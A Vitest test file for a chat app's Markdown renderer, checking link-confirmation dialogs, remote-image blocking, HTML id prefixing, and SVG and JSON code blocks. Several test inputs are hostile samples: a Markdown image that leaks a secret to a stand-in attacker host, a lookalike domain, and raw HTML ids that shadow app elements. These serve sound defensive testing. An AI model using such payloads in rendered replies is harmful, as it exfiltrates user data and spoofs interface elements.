import { afterEach, beforeAll, describe, expect, it, vi } from 'vitest'
import { act, cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import Markdown from './MarkdownRenderer'
import { stubAnimate } from '../../../test/animate'
import { LinkCheckContext, type LinkCheck } from './LinkCheckContext'
import { appUrl } from '../../../lib/appRoot'

afterEach(() => { cleanup(); vi.restoreAllMocks() })

const markdown = '[docs](https://Docs.Example.com:8443/guide) and [lookalike](https://docs.example.com.evil.test/)'
const openSpy = () => vi.spyOn(window, 'open').mockImplementation(() => null)

describe('external link confirmation (TAL-279)', () => {
  it('asks in a labelled app dialog; Cancel and Escape dismiss, Open opens a new tab', async () => {
    const open = openSpy()
    render(<Markdown text={markdown} />)
    await userEvent.click(await screen.findByRole('button', { name: 'docs' }))
    const dialog = await screen.findByRole('dialog', { name: 'Open external link?' })
    // Without a server answer (shared transcripts) the dialog names no host it would have to derive.
    expect(dialog).toHaveTextContent('This link opens outside Talaria.')
    expect(dialog).toHaveTextContent('https://docs.example.com:8443/guide')
    await userEvent.click(screen.getByRole('button', { name: 'Cancel' }))
    await waitFor(() => { expect(screen.queryByRole('dialog')).toBeNull() })

    await userEvent.click(screen.getByRole('button', { name: 'docs' }))
    await screen.findByRole('dialog', { name: 'Open external link?' })
    await userEvent.keyboard('{Escape}')
    await waitFor(() => { expect(screen.queryByRole('dialog')).toBeNull() })
    expect(open).not.toHaveBeenCalled()

    await userEvent.click(screen.getByRole('button', { name: 'docs' }))
    await userEvent.click(await screen.findByRole('button', { name: 'Open link' }))
    expect(open).toHaveBeenCalledWith('https://docs.example.com:8443/guide', '_blank', 'noreferrer')
    await waitFor(() => { expect(screen.queryByRole('dialog')).toBeNull() })
  })

  it('opens a link directly only when the server says so, asking with the clicked URL', async () => {
    const open = openSpy()
    const check = vi.fn((url: string) => Promise.resolve(url.includes('evil') ? { opens_directly: false, host: 'server-named.test' } : { opens_directly: true, host: 'docs.example.com' }))
    render(<LinkCheckContext value={check}><Markdown text={markdown} /></LinkCheckContext>)
    await userEvent.click(await screen.findByRole('button', { name: 'docs' }))
    await waitFor(() => { expect(open).toHaveBeenCalledWith('https://docs.example.com:8443/guide', '_blank', 'noreferrer') })
    expect(check).toHaveBeenCalledWith('https://docs.example.com:8443/guide')
    expect(screen.queryByRole('dialog')).toBeNull()

    await userEvent.click(screen.getByRole('button', { name: 'lookalike' }))
    expect(await screen.findByRole('dialog', { name: 'Open external link?' })).toHaveTextContent('This link goes to server-named.test.')
    expect(check).toHaveBeenLastCalledWith('https://docs.example.com.evil.test/')
    expect(open).toHaveBeenCalledTimes(1)
  })

  it('warns when the server check fails or does not answer in time', async () => {
    const open = openSpy()
    const { unmount } = render(<LinkCheckContext value={() => Promise.reject(new Error('offline'))}><Markdown text={markdown} /></LinkCheckContext>)
    await userEvent.click(await screen.findByRole('button', { name: 'docs' }))
    await screen.findByRole('dialog', { name: 'Open external link?' })
    unmount()

    render(<LinkCheckContext value={() => new Promise<LinkCheck>(() => undefined)}><Markdown text={markdown} /></LinkCheckContext>)
    const link = await screen.findByRole('button', { name: 'docs' })
    vi.useFakeTimers()
    try {
      // fireEvent, not userEvent: Testing Library's async wrapper awaits a timer that Vitest's fake clock holds.
      fireEvent.click(link)
      // The server check never answers; the link waits out its deadline, then warns.
      await act(async () => { await vi.advanceTimersByTimeAsync(700) })
      expect(screen.getByRole('dialog', { name: 'Open external link?' })).toBeInTheDocument()
    } finally {
      vi.useRealTimers()
    }
    expect(open).not.toHaveBeenCalled()
  })
})

describe('remote images (TAL-2199)', () => {
  it('never loads a remote image handed to it directly, and keeps app media', async () => {
    render(<Markdown text={'![leak](https://evil.example/p.png?d=SECRET) ![proto](//evil.example/q.png) ![local](./api/media?path=%2Ftmp%2Fa.png)\n\n<img src="https://evil.example/r.png" alt="raw">'} />)
    await screen.findByRole('img', { name: 'local' })
    expect([...document.querySelectorAll('img')].map((img) => img.getAttribute('src'))).toEqual([appUrl('api/media?path=%2Ftmp%2Fa.png').href])
    expect(document.body.innerHTML).not.toContain('evil.example')
  })
})

describe('content ids (TAL-2217)', () => {
  afterEach(() => { Reflect.deleteProperty(HTMLElement.prototype, 'scrollIntoView') })

  it('prefixes raw HTML ids, so a reply never shadows an app element', async () => {
    render(<><div data-testid="reply"><Markdown text={'<a id="fileInput" href="https://evil.example">x</a> <div id="msg">m</div> <span id="rightpanelSlot">s</span>'} /></div><input id="fileInput" /></>)
    const reply = screen.getByTestId('reply')
    await within(reply).findByText('m')
    expect([...reply.querySelectorAll('[id]')].map((element) => element.id)).toEqual(['user-content-msg', 'user-content-rightpanelSlot'])
    expect(document.getElementById('fileInput')).toBe(document.querySelector('input'))
  })

  it('jumps an in-document or footnote link to its target in the same reply, without the link check', async () => {
    const scrollIntoView = vi.fn()
    Object.defineProperty(HTMLElement.prototype, 'scrollIntoView', { configurable: true, value: scrollIntoView })
    const open = openSpy()
    const check = vi.fn(() => Promise.resolve<LinkCheck>({ opens_directly: true, host: null }))
    render(
      <LinkCheckContext value={check}>
        <Markdown text={'An earlier note[^1].\n\n[^1]: Earlier footnote.'} />
        <div data-testid="reply"><Markdown text={'<h2 id="heading">Heading</h2>\n\n[jump](#heading) and a note[^1].\n\n[^1]: Footnote text.'} /></div>
      </LinkCheckContext>,
    )
    const reply = screen.getByTestId('reply')
    await userEvent.click(await within(reply).findByRole('button', { name: 'jump' }))
    await userEvent.click(within(reply).getByRole('button', { name: '1' }))
    await waitFor(() => { expect(scrollIntoView).toHaveBeenCalledTimes(2) })
    expect(scrollIntoView.mock.contexts).toEqual([within(reply).getByRole('heading', { name: 'Heading' }), within(reply).getByText('Footnote text.').closest('li')])
    expect(check).not.toHaveBeenCalled()
    expect(open).not.toHaveBeenCalled()
    expect(screen.queryByRole('dialog')).toBeNull()
  })
})

describe('angle-bracket text (TAL-2715)', () => {
  it.each(['Run git checkout <branch-name> now', 'File "<stdin>", line 1, in <module>', 'before <!-- note --> after'])('shows %j in full', (text) => {
    render(<Markdown text={text} />)
    expect(screen.getByText(text, { selector: 'p' })).toBeInTheDocument()
  })

  it('keeps HTML the sanitizer allows as elements', () => {
    const { container } = render(<Markdown text={'<details><summary>s</summary>inner</details>\n\nPress <kbd>Ctrl</kbd>.'} />)
    expect(container.querySelector('details > summary')).toHaveTextContent('s')
    expect(container.querySelector('details')).toHaveTextContent('inner')
    expect(container.querySelector('kbd')).toHaveTextContent('Ctrl')
  })

  it('shows an HTML block mixing an allowed and an unknown tag as text, making neither an element', () => {
    const { container } = render(<Markdown text={'<details><branch-name></details>'} />)
    expect(container.querySelector('details, branch-name')).toBeNull()
    expect(container).toHaveTextContent('<details><branch-name></details>')
  })
})

describe('svg code blocks (TAL-2678)', () => {
  const fence = (source: string) => `\`\`\`svg\n${source}\n\`\`\``
  const drawing = '<svg xmlns="http://www.w3.org/2000/svg" width="8" height="8"><rect width="8" height="8"/></svg>'
  // The lightbox loads its viewer lazily; a warm module keeps that load inside the query's wait.
  beforeAll(() => import('../LightboxViewer'))
  // Streamdown's plain code block, which held svg fences before, scrolls to the end while streaming.
  afterEach(() => { Reflect.deleteProperty(HTMLElement.prototype, 'scrollTo') })

  it('offers View only once an svg fence settles, and opens its source as an image data URI', async () => {
    Object.defineProperty(HTMLElement.prototype, 'scrollTo', { configurable: true, value: vi.fn() })
    const text = `${fence(drawing)}\n\n\`\`\`xml\n${drawing}\n\`\`\``
    const { rerender } = render(<Markdown text={text} streaming />)
    await waitFor(() => { expect(screen.getAllByRole('button', { name: 'Copy Code' })).toHaveLength(2) })
    expect(screen.queryByRole('button', { name: 'View image' })).toBeNull()
    rerender(<Markdown text={text} />)
    await screen.findByRole('button', { name: 'View image' })
    expect(screen.getAllByRole('button', { name: 'View image' })).toHaveLength(1)
    await userEvent.click(screen.getByRole('button', { name: 'View image' }))
    const dialog = await screen.findByRole('dialog', { name: 'SVG' })
    const image = await within(dialog).findByRole('img', { name: 'SVG' })
    expect(image).toHaveAttribute('src', `data:image/svg+xml;charset=utf-8,${encodeURIComponent(`${drawing}\n`)}`)
  })

  it('shows the failure state for source that is not a well-formed svg and keeps the code block', async () => {
    const broken = '<svg xmlns="http://www.w3.org/2000/svg"><rect></svg'
    render(<Markdown text={fence(broken)} />)
    await userEvent.click(await screen.findByRole('button', { name: 'View image' }))
    const dialog = await screen.findByRole('dialog', { name: 'SVG' })
    // jsdom decodes no images; the browser reports a malformed SVG to the image the same way.
    fireEvent.error(await within(dialog).findByRole('img', { name: 'SVG' }))
    expect(within(dialog).getByRole('alert')).toHaveTextContent('Could not load image')
    expect(document.querySelector('[data-streamdown="code-block-body"]')).toHaveTextContent(broken)
  })
})

describe('JSON code blocks (TAL-615)', () => {
  it('toggles a parsed JSON block between the raw code and a tree, and leaves other blocks raw', async () => {
    render(<Markdown text={'```json\n{"name": "talaria", "tags": ["web", "app"], "nested": {"deep": {"leaf": null}}}\n```\n\n```json\n{"broken": \n```'} />)
    const toggle = await screen.findByRole('button', { name: 'Tree' })
    expect(screen.getAllByRole('button', { name: 'Tree' })).toHaveLength(1)
    expect(document.querySelector('[data-json-tree]')).toBeNull()
    await userEvent.click(toggle)
    const tree = document.querySelector('[data-json-tree]')!
    expect(tree).toHaveTextContent('"name": "talaria"')
    expect(tree).toHaveTextContent('"web"')
    // Deep levels start folded, as in the legacy tree.
    const deep = [...tree.querySelectorAll('details')].find((node) => node.querySelector(':scope > summary')?.textContent.includes('"deep"'))
    expect(deep).not.toHaveAttribute('open')
    await userEvent.click(screen.getByRole('button', { name: 'Raw' }))
    expect(document.querySelector('[data-json-tree]')).toBeNull()
    expect(screen.getByRole('button', { name: 'Tree' })).toBeInTheDocument()
  })
})

describe('fade text effect (TAL-2148)', () => {
  const text = 'Streamed words arrive\n\n```ts\nconst kept = 1\n```\n'
  const motion = (reduce: boolean) => { vi.stubGlobal('matchMedia', vi.fn(() => ({ matches: reduce, addEventListener: vi.fn(), removeEventListener: vi.fn() }))) }
  const animated = (container: HTMLElement) => container.querySelectorAll('p [data-sd-animate]').length
  afterEach(() => { vi.unstubAllGlobals(); Reflect.deleteProperty(HTMLElement.prototype, 'scrollTo') })

  it('fades streamed words in when on, never inside a code block, and nothing when off or reduced motion is set', () => {
    HTMLElement.prototype.scrollTo = vi.fn()
    motion(false)
    const view = render(<Markdown text={text} streaming fade />)
    expect(animated(view.container)).toBeGreaterThan(0)
    expect(view.container.querySelector('[data-streamdown="code-block"] [data-sd-animate]')).toBeNull()
    view.rerender(<Markdown text={text} streaming />)
    expect(animated(view.container)).toBe(0)
    cleanup()
    motion(true)
    expect(animated(render(<Markdown text={text} streaming fade />).container)).toBe(0)
  })
})

it('follows only the live enabled answer height and releases it immediately on opt-out or settlement', () => {
  const motion = stubAnimate()
  let resized = () => undefined
  const disconnect = vi.fn()
  vi.stubGlobal('ResizeObserver', class {
    constructor(callback: () => undefined) { resized = callback }
    observe = vi.fn()
    disconnect = disconnect
  })
  let height = 24
  vi.spyOn(HTMLElement.prototype, 'getBoundingClientRect').mockImplementation(function (this: HTMLElement) {
    return { height: this.hasAttribute('data-stream-height') ? 24 : height } as DOMRect
  })
  try {
    const view = render(<Markdown text="Streaming" streaming fade />)
    height = 72
    act(() => resized())
    expect(motion.reveals()).toHaveLength(1)
    expect(motion.reveals()[0]!.keyframes).toEqual([{ height: '24px' }, { height: '72px' }])
    const instant = render(<Markdown text="Streaming" streaming />).container.innerHTML
    view.rerender(<Markdown text="Streaming" streaming />)
    expect(view.container.innerHTML).toBe(instant)
    expect(disconnect).toHaveBeenCalled()
    expect(motion.reveals()[0]!.cancel).toHaveBeenCalled()
    view.rerender(<Markdown text="Streaming" streaming fade />)
    view.rerender(<Markdown text="Streaming" fade />)
    expect(view.container.querySelector('[data-stream-height]')).toBeNull()
    vi.stubGlobal('matchMedia', () => ({ matches: true }))
    view.rerender(<Markdown text="Streaming" streaming fade />)
    expect(view.container.innerHTML).toBe(instant)
  } finally { motion.restore(); vi.unstubAllGlobals() }
})
